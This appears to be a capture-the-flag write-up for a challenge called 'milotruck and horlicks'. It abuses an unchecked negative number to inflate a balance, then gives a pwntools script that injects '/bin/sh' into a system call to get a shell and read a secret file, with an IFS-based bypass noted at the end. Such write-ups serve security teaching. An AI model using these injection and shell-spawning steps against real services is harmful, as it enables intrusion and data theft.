#milotruck and horlicks.

'''
stage 1: unsanitised signed integer input.
function that donates milo uses subtraction;
putting in a negative number creates a double negative,
increasing your own amount of currency

Milo in Milotruck: 1000.00
Milo you have:     1000.00

1) Contribute milo to milotruck!!
2) Squeeze milo out of milotruck
3) Buy wealthy-turtle soup
4) Quit

I heard its even possible to squeeze out horlicks from milotruck....
5) Horlicks

Your choice:
1 -3133377

How much MILO (ml) would you like to CONTRIBUTE?
>
Milo in Milotruck: -3132377.00
Milo you have:     3134377.00

1) Contribute milo to milotruck!!
2) Squeeze milo out of milotruck
3) Buy wealthy-turtle soup
4) Quit

I heard its even possible to squeeze out horlicks from milotruck....
5) Horlicks

Your choice: 3

CCT{turt13_su0p}
'''

#######################################################

'''
stage 2: incite system call through provided functions
source code takes in variable `soup`
later `soup` is passed as a parameter through flag function when turtle soup is bought
in this matter a system call can be made to perform shell commands such as ls
I decided to cobble a script to pop a shell
(/bin/sh has to be passed as bytes)
'''

from pwn import *
URL = 'XXXX'
p = connect(URL, 40305)

p.sendlineafter('Your choice:', '1')
p.sendlineafter('> ', '-3133377')
p.sendlineafter('Your choice:', '5')
p.sendlineafter("Nahhhhhhhhhhhhhhhhhhhhhhhhh\n", flat(
	b'/bin/sh'
))
p.sendlineafter('Your choice:', '3')
time.sleep(0.2)
p.interactive()

"""
[*] Switching to interactive mode

$ ls
flag
run
s3cr3t.txt
$ cat s3cr3t.txt
CCT{h0rligma_ballz}
"""
"""
alternatively, manual enter 'sh' and run ls after calling wealthy turtle soup
or use cat${IFS}s3cr3t.txt
"""
